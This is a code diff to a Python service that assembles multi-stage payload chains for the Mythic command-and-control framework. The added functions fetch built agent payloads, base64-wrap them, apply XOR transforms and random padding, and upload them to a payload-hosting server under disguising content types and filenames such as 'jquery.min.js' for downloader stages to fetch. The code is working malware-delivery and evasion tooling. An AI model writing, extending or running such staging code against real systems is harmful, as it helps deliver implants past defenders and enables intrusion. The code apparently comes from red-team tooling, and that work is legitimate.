@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import base64
 import json
 from collections import defaultdict
 from typing import Any
@@ -310,6 +311,111 @@ def _resolve_vars_in_params(params: dict[str, Any], variables: dict[str, str]) -
     return {k: _resolve_vars(v, variables) for k, v in params.items()}
 
 
+async def _upload_to_payload_server(
+    server_url: str,
+    server_token: str,
+    payload_bytes: bytes,
+    uri: str,
+    content_type: str,
+    prepend_bytes: int,
+    append_bytes: int,
+    dl_filename: str,
+    transform: str,
+    xor_key: int,
+    note: str,
+) -> None:
+    """
+    Upload a payload binary to payload-server management API.
+    Overwrites if same URI already exists.
+    """
+    import aiohttp
+    url = f'{server_url.rstrip("/")}/api/files'
+    headers = {'X-Token': server_token}
+    form = aiohttp.FormData()
+    form.add_field('uri', uri)
+    form.add_field('content_type', content_type)
+    form.add_field('prepend_bytes', str(prepend_bytes))
+    form.add_field('append_bytes', str(append_bytes))
+    form.add_field('dl_filename', dl_filename)
+    form.add_field('transform', transform)
+    form.add_field('xor_key', str(xor_key))
+    form.add_field('note', note)
+    form.add_field('file', payload_bytes, filename=uri.split('/')[-1], content_type='application/octet-stream')
+    async with aiohttp.ClientSession() as session:
+        async with session.post(url, data=form, headers=headers, ssl=False) as resp:
+            if resp.status not in (200, 201):
+                body = await resp.text()
+                raise ValueError(f'payload-server returned HTTP {resp.status}: {body}')
+
+
+async def _wrap_filehost_envelope(
+    mythic_client,
+    file_uuid: str,
+    stage_params: dict,
+    variables: dict,
+    emit,
+) -> str:
+    """
+    Download the payload binary from Mythic, wrap it in a filehost envelope JSON,
+    re-upload it, and return the new file UUID.
+
+    Supported stage_params keys (all optional):
+      - filehost_content_type   : str  e.g. 'text/javascript'
+      - filehost_filename       : str  e.g. 'jquery.min.js'
+      - filehost_prepend_bytes  : int  e.g. 512
+    """
+    import aiohttp
+
+    mythic_url = settings.mythic_url or 'http://mythic_server:17443'
+    mythic_token = settings.mythic_password or ''
+
+    # 1. Download the raw payload binary from Mythic
+    dl_url = f'{mythic_url.rstrip("/")}/direct/download/{file_uuid}'
+    headers = {'Authorization': f'Bearer {mythic_token}'}
+    async with aiohttp.ClientSession() as session:
+        async with session.get(dl_url, headers=headers, ssl=False) as resp:
+            if resp.status != 200:
+                raise ValueError(f'Failed to download file {file_uuid} from Mythic (HTTP {resp.status})')
+            raw_bytes = await resp.read()
+
+    # 2. Build envelope
+    content_type = _resolve_vars(stage_params.get('filehost_content_type', 'application/octet-stream'), variables)
+    filename = _resolve_vars(stage_params.get('filehost_filename', ''), variables) or None
+    prepend_bytes = int(stage_params.get('filehost_prepend_bytes', 0))
+
+    envelope = {
+        'content_type': content_type,
+        'filename_override': filename,
+        'prepend_bytes': prepend_bytes,
+        'encoding': 'base64',
+        'payload': base64.b64encode(raw_bytes).decode(),
+    }
+    envelope_bytes = json.dumps(envelope, separators=(',', ':')).encode()
+
+    # 3. Upload envelope JSON as a new file to Mythic
+    upload_url = f'{mythic_url.rstrip("/")}/api/v1.4/files/'
+    form = aiohttp.FormData()
+    form.add_field('file', envelope_bytes, filename='envelope.json', content_type='application/json')
+    async with aiohttp.ClientSession() as session:
+        async with session.post(upload_url, data=form, headers=headers, ssl=False) as resp:
+            if resp.status not in (200, 201):
+                raise ValueError(f'Failed to upload envelope to Mythic (HTTP {resp.status})')
+            result = await resp.json()
+            new_uuid = result.get('agent_file_id') or result.get('file_id') or result.get('id', '')
+            if not new_uuid:
+                raise ValueError(f'Mythic did not return a file UUID for envelope upload: {result}')
+
+    await emit({
+        'type': 'log', 'level': 'info',
+        'msg': (
+            f'filehost envelope uploaded (ct={content_type}, '
+            f'filename={filename or "(none)"}, prepend={prepend_bytes}B) '
+            f'→ uuid={new_uuid}'
+        ),
+    })
+    return new_uuid
+
+
 async def apply_graph_to_mythic(
     payload: ApplyRequest,
     db=None,
@@ -339,6 +445,8 @@ async def apply_graph_to_mythic(
     for stage_idx, node_id in enumerate(_ordered_node_ids(payload.graph), 1):
         node = node_map[node_id]
         data = node.data
+        # Resolve {{VAR}} placeholders — must be defined before any _resolve_vars call
+        variables = payload.variables or {}
         payload_type_name = _resolve_payload_type(data.label, data.payload)
         # Resolve vars in stage label (used as filename in Mythic)
         resolved_label = _resolve_vars(data.label, variables)
@@ -347,8 +455,6 @@ async def apply_graph_to_mythic(
         await _emit({'type': 'stage_start', 'level': 'info',
                      'msg': f'[{stage_idx}/{total_stages}] Building {data.stage_type} stage "{data.label}" ({payload_type_name})...',
                      'stage': data.label, 'stage_type': data.stage_type, 'idx': stage_idx, 'total': total_stages})
-        # Resolve {{VAR}} placeholders in all params before processing
-        variables = payload.variables or {}
         raw_params = _resolve_vars_in_params(data.parameters or {}, variables)
         # Upload any locally-cached files (build params)
         resolved_params = await _upload_local_files_to_mythic(raw_params, mythic_client, db)
@@ -415,12 +521,6 @@ async def apply_graph_to_mythic(
                     suggestion='Connect one payload or wrapper into this stage before retrying.',
                 )
             upstream_node = node_map.get(upstream_ids[0])
-            if upstream_node and upstream_node.data.stage_type not in {'base', 'wrapper'}:
-                raise MythicApplyStageError(
-                    f'Wrapper stage {data.label} can only wrap payload or wrapper stages, not {upstream_node.data.stage_type}.',
-                    stage_label=data.label,
-                    suggestion='Reconnect the wrapper so it points to a payload or another wrapper.',
-                )
             upstream = created_payloads.get(upstream_ids[0])
             wrapped_uuid = upstream.get('uuid') if upstream else None
             if not wrapped_uuid:
@@ -553,47 +653,143 @@ async def apply_graph_to_mythic(
                 ) from exc
 
             c2_profile_id = None
-            for profile in c2_profiles_info.get('c2profile', []):
-                if profile['name'] == data.c2_profile:
-                    c2_profile_id = profile['id']
-                    break
+            if data.c2_profile and data.c2_profile != 'payload-server':
+                for profile in c2_profiles_info.get('c2profile', []):
+                    if profile['name'] == data.c2_profile:
+                        c2_profile_id = profile['id']
+                        break
+                if not c2_profile_id:
+                    raise MythicApplyStageError(
+                        f'Downloader stage {data.label}: C2 profile "{data.c2_profile}" not found or not running.',
+                        stage_label=data.label,
+                        suggestion=f'Make sure the {data.c2_profile} C2 container is running in Mythic.',
+                    )
 
-            if not c2_profile_id:
-                raise MythicApplyStageError(
-                    f'Downloader stage {data.label}: C2 profile "{data.c2_profile}" not found or not running.',
-                    stage_label=data.label,
-                    suggestion=f'Make sure the {data.c2_profile} C2 container is running in Mythic.',
-                )
+            # 3. Host the payload file
+            # Special downloader params (resolved from variables):
+            #   downloader_prepend     : int  — random bytes prepended to payload
+            #   downloader_contenttype : str  — Content-Type served to client
+            dl_prepend     = int(_resolve_vars(str(data.parameters.get('downloader_prepend', 0)), variables))
+            dl_append      = int(_resolve_vars(str(data.parameters.get('downloader_append', 0)), variables))
+            dl_contenttype = _resolve_vars(str(data.parameters.get('downloader_contenttype', 'application/octet-stream')), variables)
+            dl_filename    = _resolve_vars(str(data.parameters.get('downloader_filename', '')), variables)
+            dl_transform   = _resolve_vars(str(data.parameters.get('downloader_transform', '')), variables)
+            dl_xor_key     = int(_resolve_vars(str(data.parameters.get('downloader_xor_key', '0x41')), variables), 0)
 
-            # 3. Host the payload file on the C2 at profile_url
-            try:
-                host_result = await mythic_utilities.graphql_post(
-                    mythic=mythic_client,
-                    gql_query=gql.gql(
-                        'mutation hostFileMutation($c2_id: Int!, $file_uuid: String!, $host_url: String!, $alert_on_download: Boolean, $remove: Boolean) {'
-                        ' c2HostFile(c2_id: $c2_id file_uuid: $file_uuid host_url: $host_url alert_on_download: $alert_on_download remove: $remove) {'
-                        ' status error __typename } }'
+            _ps_settings = settings_service.get_all(db) if db else {}
+            ps_url   = _ps_settings.get('payload_server_url')   or settings.payload_server_url   or None
+            ps_token = _ps_settings.get('payload_server_token') or settings.payload_server_token or None
+
+            if ps_url and ps_token:
+                # ── payload-server path ───────────────────────────────────────
+                await _emit({
+                    'type': 'log', 'level': 'info',
+                    'msg': (
+                        f'Downloader stage {data.label}: uploading to payload-server'
+                        f' ({ps_url}{data.profile_url})…'
                     ),
-                    variables={
-                        'c2_id': c2_profile_id,
-                        'file_uuid': file_uuid_dl,
-                        'host_url': data.profile_url,
-                        'alert_on_download': False,
-                        'remove': False,
-                    },
-                )
-            except Exception as exc:
-                raise MythicApplyStageError(
-                    f'Downloader stage {data.label}: failed to host payload on C2: {exc}',
-                    stage_label=data.label,
-                ) from exc
+                })
+                # Download raw payload from Mythic first
+                import aiohttp as _aiohttp
+                # Mythic REST API endpoint for file download
+                # Use effective mythic_url (DB > .env fallback)
+                _eff_mythic_url = (settings_service.get_all(db).get('mythic_url') if db else None) or settings.mythic_url or ''
+                mythic_dl_url = f'{_eff_mythic_url.rstrip("/")}/direct/download/{file_uuid_dl}'
+                # Use the active session token from the authenticated mythic client
+                if getattr(mythic_client, 'apitoken', None):
+                    mythic_headers = {'apitoken': mythic_client.apitoken}
+                elif getattr(mythic_client, 'access_token', None):
+                    mythic_headers = {'Authorization': f'Bearer {mythic_client.access_token}'}
+                else:
+                    mythic_headers = {}
+                async with _aiohttp.ClientSession() as _sess:
+                    async with _sess.get(mythic_dl_url, headers=mythic_headers, ssl=False) as _resp:
+                        if _resp.status != 200:
+                            raise MythicApplyStageError(
+                                f'Downloader stage {data.label}: failed to download payload from Mythic (HTTP {_resp.status})',
+                                stage_label=data.label,
+                            )
+                        raw_bytes = await _resp.read()
 
-            if (host_result.get('c2HostFile') or {}).get('status') != 'success':
-                err = (host_result.get('c2HostFile') or {}).get('error', 'unknown error')
-                raise MythicApplyStageError(
-                    f'Downloader stage {data.label}: c2HostFile failed: {err}',
-                    stage_label=data.label,
-                )
+                try:
+                    await _upload_to_payload_server(
+                        server_url=ps_url,
+                        server_token=ps_token,
+                        payload_bytes=raw_bytes,
+                        uri=data.profile_url,
+                        content_type=dl_contenttype,
+                        prepend_bytes=dl_prepend,
+                        append_bytes=dl_append,
+                        dl_filename=dl_filename,
+                        transform=dl_transform,
+                        xor_key=dl_xor_key,
+                        note=f'{data.label} — chain deploy',
+                    )
+                except Exception as exc:
+                    raise MythicApplyStageError(
+                        f'Downloader stage {data.label}: payload-server upload failed: {exc}',
+                        stage_label=data.label,
+                    ) from exc
+
+                transform_info = f', transform={dl_transform}' if dl_transform else ''
+                await _emit({
+                    'type': 'log', 'level': 'success',
+                    'msg': (
+                        f'Downloader stage {data.label}: payload uploaded to payload-server'
+                        f' (ct={dl_contenttype}, prepend={dl_prepend}B, append={dl_append}B{transform_info})'
+                    ),
+                })
+
+            else:
+                # ── Mythic c2HostFile path (legacy) ───────────────────────────
+                upload_uuid = file_uuid_dl
+                if data.c2_profile == 'filehost':
+                    await _emit({
+                        'type': 'log', 'level': 'info',
+                        'msg': f'Downloader stage {data.label}: wrapping payload in filehost envelope…',
+                    })
+                    try:
+                        upload_uuid = await _wrap_filehost_envelope(
+                            mythic_client=mythic_client,
+                            file_uuid=file_uuid_dl,
+                            stage_params=data.parameters,
+                            variables=variables,
+                            emit=_emit,
+                        )
+                    except Exception as exc:
+                        raise MythicApplyStageError(
+                            f'Downloader stage {data.label}: failed to build filehost envelope: {exc}',
+                            stage_label=data.label,
+                        ) from exc
+
+                try:
+                    host_result = await mythic_utilities.graphql_post(
+                        mythic=mythic_client,
+                        gql_query=gql.gql(
+                            'mutation hostFileMutation($c2_id: Int!, $file_uuid: String!, $host_url: String!, $alert_on_download: Boolean, $remove: Boolean) {'
+                            ' c2HostFile(c2_id: $c2_id file_uuid: $file_uuid host_url: $host_url alert_on_download: $alert_on_download remove: $remove) {'
+                            ' status error __typename } }'
+                        ),
+                        variables={
+                            'c2_id': c2_profile_id,
+                            'file_uuid': upload_uuid,
+                            'host_url': data.profile_url,
+                            'alert_on_download': False,
+                            'remove': False,
+                        },
+                    )
+                except Exception as exc:
+                    raise MythicApplyStageError(
+                        f'Downloader stage {data.label}: failed to host payload on C2: {exc}',
+                        stage_label=data.label,
+                    ) from exc
+
+                if (host_result.get('c2HostFile') or {}).get('status') != 'success':
+                    err = (host_result.get('c2HostFile') or {}).get('error', 'unknown error')
+                    raise MythicApplyStageError(
+                        f'Downloader stage {data.label}: c2HostFile failed: {err}',
+                        stage_label=data.label,
+                    )
 
             # 4. Build the download URL: base_url (with vars resolved) + profile_url
             base_url = _resolve_vars(data.base_url or '', variables).rstrip('/')
